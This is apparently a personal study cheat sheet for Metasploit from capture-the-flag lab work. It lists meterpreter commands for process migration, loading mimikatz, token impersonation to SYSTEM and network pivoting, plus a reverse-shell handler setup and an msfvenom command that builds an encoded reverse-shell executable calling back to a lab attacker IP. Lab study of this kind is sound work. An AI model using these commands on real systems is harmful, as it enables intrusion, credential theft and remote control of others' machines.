# Metasploit

db_nmap -sV 10.10.134.20
> hosts
> services

## Meterpreter

Getting info
	sysinfo
	ps
	getuid
	getgid
	getprivs -> Get all privileges of the current user
	upload -> transfer files
	ipconfig -> get network information

Post
	migrate PID -> Poison another process
	load kiwi -> load the last mimikatz version
	run -> Executes a meterpreter script or Post module

Search files
	search -f root.flag

Background the session
	bg

Using powershell
	load powershell
	powershell_shell

run post/windows/gather/checkvm -> Check if target is a virtual machine
run post/multi/recon/local_exploit_suggester -> check for various explotis
run post/windows/manage/enable_rdp -> tries to enable rdp

### Listen session as ncat
use exploit/multi/handler
set Payload windows/meterpreter_reverse_tcp 
set lhost 10.9.186.161
run
### Networking
run autoroute -h
run autoroute -s 172.18.1.0 -n 255.255.255.0 -> What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.

### Impersonate token
	load incognito
	list_tokens -g
	impersonate_token "BUILTIN\Administrators"
	getuid -> NT AUTHORITY\SYSTEM


## MSFVenom

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.9.186.161 LPORT=8877 -b "\x00" -e x86/shikata_ga_nai -f exe -o mtprt.exe





